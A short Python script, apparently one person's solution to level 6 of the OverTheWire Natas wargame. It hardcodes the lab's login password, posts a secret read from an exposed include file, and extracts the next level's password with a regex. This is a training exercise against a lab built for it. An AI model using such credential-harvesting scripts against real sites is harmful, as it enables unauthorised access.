#!/usr/bin/env python

#using requests module for python, not sure if I will need to install anything for this?
import requests
import re

username = 'natas6'
password = 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR'
url = 'http://%s.natas.labs.overthewire.org/' % username
#I can't get this to format in sublime
#I had to open it up in the web browser, but it has an if statement about printing the secret
#but what you can notice on the /index-source.html is: include "includes/secret.inc";
#yields $secret = "FOEIUWGHFEEUHOFUOIU";
print(url) #make sure the URL works fine

#need to use the session I guess? not sure how needed
session = requests.Session()
#notice post here, since we're sending data and must post the secret per the first page we looked at
#also notice we're passing a key called submit
response = requests.post(url, data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit" : "submit"}, auth = (username, password))

content = response.text


######################
#print(content)

print(re.findall('Access granted. The password for natas7 is (.*)', content))
print('SDG')